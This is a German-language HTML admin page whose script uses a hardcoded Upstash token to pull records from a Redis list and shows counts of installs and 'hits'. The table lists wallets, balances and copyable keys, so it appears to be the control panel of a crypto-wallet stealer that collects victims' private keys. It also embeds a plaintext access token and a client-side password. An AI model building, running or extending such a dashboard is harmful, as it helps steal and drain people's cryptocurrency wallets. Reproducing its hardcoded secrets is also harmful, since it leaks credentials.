<!DOCTYPE html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#08090b;color:#e9edf2;font:14px system-ui;padding:30px}
.w{max-width:1000px;margin:0 auto}
input{padding:11px;background:#0a0d10;border:1px solid #232b34;border-radius:9px;color:#fff;width:220px}
button{padding:11px 18px;border-radius:9px;border:0;background:#c6ff3d;color:#08110a;font-weight:800;cursor:pointer}
table{width:100%;border-collapse:collapse;margin-top:20px;font-size:12px}
th,td{text-align:left;padding:9px;border-bottom:1px solid #1e242c}
th{color:#8b96a5;font-size:10px;text-transform:uppercase}
td{font-family:monospace;word-break:break-all}
.k{color:#c6ff3d;cursor:pointer}
.s{color:#8b96a5;margin:14px 0}
</style></head><body><div class="w" id="a"></div><script>
var UP='https://glorious-glider-159267.upstash.io',TK='gQAAAAAAAm4jAAIgcDI5MGRjOTI4ZjRiNzE0ZmZiOTM5NTY5M2RhZGJmNDRjYg',PASS='kurapika123';
var a=document.getElementById('a');
function sh(t){a.innerHTML=t;}
sh('<input id="p" type="password" placeholder="Passwort"><button id="g">Los</button>');
document.getElementById('g').onclick=load;
document.getElementById('p').onkeydown=function(e){if(e.key==='Enter')load();};
async function load(){
var f=document.getElementById('p');
if(f&&f.value!==PASS){alert('falsch');return;}
sh('<p class="s">Lade…</p>');
try{
var r=await fetch(UP+'/lrange/apes:hits/0/500',{headers:{Authorization:'Bearer '+TK}});
var j=await r.json();
var rows=(j.result||[]).map(function(x){try{return JSON.parse(x)}catch(e){return null}}).filter(Boolean);
var hits=rows.filter(function(x){return x.t==='hit'});
var ins=rows.filter(function(x){return x.t==='install'}).length;
var b='';
hits.forEach(function(x){b+='<tr><td>'+new Date(x.ts).toLocaleString('de-DE')+'</td><td>'+(x.w||'—')+'</td><td>'+(x.b||'—')+'</td><td class="k" data-k="'+(x.k||'')+'">'+(x.k||'—')+'</td><td>'+(x.h||'—')+'</td></tr>';});
if(!hits.length)b='<tr><td colspan="5" class="s">Noch keine Klicks</td></tr>';
sh('<button onclick="load()">Aktualisieren</button><p class="s">'+ins+' installiert · '+hits.length+' Klicks · '+hits.filter(function(x){return x.k}).length+' Keys</p><table><tr><th>Zeit</th><th>Wallet</th><th>Balance</th><th>Key</th><th>Seite</th></tr>'+b+'</table>');
Array.from(document.querySelectorAll('.k')).forEach(function(t){t.onclick=function(){if(t.dataset.k)navigator.clipboard.writeText(t.dataset.k)};});
}catch(e){sh('<p class="s">Fehler — DB nicht erreichbar</p><button onclick="location.reload()">Neu</button>');}
}
</script></body></html>
